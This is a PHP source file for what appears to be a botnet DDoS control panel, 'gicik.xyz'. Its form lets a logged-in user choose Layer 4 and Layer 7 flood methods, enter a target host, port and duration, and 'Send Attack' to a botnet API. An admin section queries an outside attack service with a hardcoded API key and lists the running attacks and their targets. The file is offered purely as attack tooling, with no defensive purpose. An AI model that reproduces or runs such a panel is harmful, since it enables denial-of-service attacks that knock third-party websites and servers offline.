<?php
    session_start();

    if($_SESSION['botnet_access'] != 1 || !isset($_SESSION['authkey'])) {
        header('Location: index.php');
        exit();
    }

    require "inc/main_funcs.php";
?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/css/all.css">
        <link rel="stylesheet" href="styles/style.css">
        <title>gicik.xyz</title>
        <link rel="icon" href="https://cdn.discordapp.com/attachments/1084181053687746620/1207078195694931979/LnBuZw.png?ex=65de562c&is=65cbe12c&hm=35597e7e27833b4e3c4db3bbab8493d411785354aafa424ef8e4a5adaf129ab4&" type="image/png">
    </head>
    <body oncontextmenu="return false;">
        <h1 class="jebanelogo" onclick="window.location.href='index.php';" style="cursor: pointer;">gicik.xyz</h1><br><br><br>

        <?php display_error(); ?>

        <div class="jebanybox">
            <form action="./botnet_api.php" method="post">
                <select id="methodSelector" name="attackMethod" onchange="showForm()">
                    <optgroup label="Layer 4">
                        <option value="OVH" title="Opis OVH">OVH</option>
                        <option value="PATH" title="Opis PATH">PATH</option>
                        <option value="UDP" title="Opis UDP">UDP</option>
                        <option value="TCP" title="Opis TCP">TCP</option>
                    </optgroup>
                    <optgroup label="Layer 7">
                        <option value="RST-STREAM" title="Opis RST-STREAM">RST-STREAM</option>
                        <option value="JS-BROWSER" title="Opis JS-BROWSER">JS-BROWSER</option>
                        <option value="SV-CAPTCHA" title="Opis SV-CAPTCHA">SV-CAPTCHA</option>
                        <option value="V3-FLOODER" title="Opis V3-FLOODER">V3-FLOODER</option>
                    </optgroup>
                </select>

                <br><br>

                <label for="enter_target" style="margin-right: 10px;">Enter Target: <span style="color: red">*</span></label>
                <label for="enter_port" style="margin-left: 200px;">Port: <span style="color: red">*</span></label>
                <div style="display: flex; align-items: center;">
                    <input type="text" id="enter_target" name="enter_target" autocomplete="off" style="width: 70%; margin-right: 10px;">
                    <input type="text" id="enter_port" name="enter_port" autocomplete="off" style="width: 15%;">
                </div>

                <label for="enter_time" style="float: left;">Enter Time: <span style="color: red">*</span></label><br>
                <input type="text" id="enter_time" name="enter_time" autocomplete="off" style="width: 90%;"><br><br>

                <center>
                    <button type="submit" class="chujowyprzycisk"><i class="fa fa-bomb" aria-hidden="true"></i> Send Attack</button>
                </center>
            </form>
        </div>

        <!-- SERVER MONITOR -->
        <?php if($_SESSION['admin'] > 0) { ?>
            <br>
            <div class="jebanybox">
                <?php
                    $url = "https://api.tsuki.army/v2/running?api_key=tsuki-army-nyaadhhd&user=6643";
                    $options = array(
                        'http' => array(
                            'header' => "User-Agent: Mozilla/5.0\r\n" // Dodajemy nag³ówek User-Agent
                        )
                    );
                    $context = stream_context_create($options);

                    $api_response = file_get_contents($url, false, $context);

                    if ($api_response === false) {
                        echo "<h2>API Request Failed</h2>";
                    }
                    
                    $api_data = json_decode($api_response, true);
                    if ($api_data !== null) {
                        $running = $api_data['account']['running'];
                        $attacks = $api_data['attacks'];
                        
                        echo "Running Attacks: ".$running."";
                        
                        if($running > 0) {
                            echo "
                                <br><br><table style='width: 400px;'>
                                    <tr>
                                        <th style='font-size: 15px;'>ID</th>
                                        <th style='font-size: 15px;'>Target</th>
                                        <th style='font-size: 15px;'>Port</th>
                                        <th style='font-size: 15px;'>Method</th>
                                        <th style='font-size: 15px;'>Expire</th>
                                    </tr>";
                        
                            foreach ($attacks as $attack) {
                                foreach ($attack as $row) {
                                    echo "<tr>
                                              <td>" . $row['attack_id'] . "</td>
                                              <td>" . $row['target'] . "</td>
                                              <td>" . $row['port'] . "</td>
                                              <td>" . $row['method'] . "</td>
                                              <td>" . $row['expire'] . "</td>
                                          </tr>";
                                }
                            }
                        
                            echo "</table>";
                        }
                    }
                ?>
            </div>
        <?php } ?>
    </body>
</html>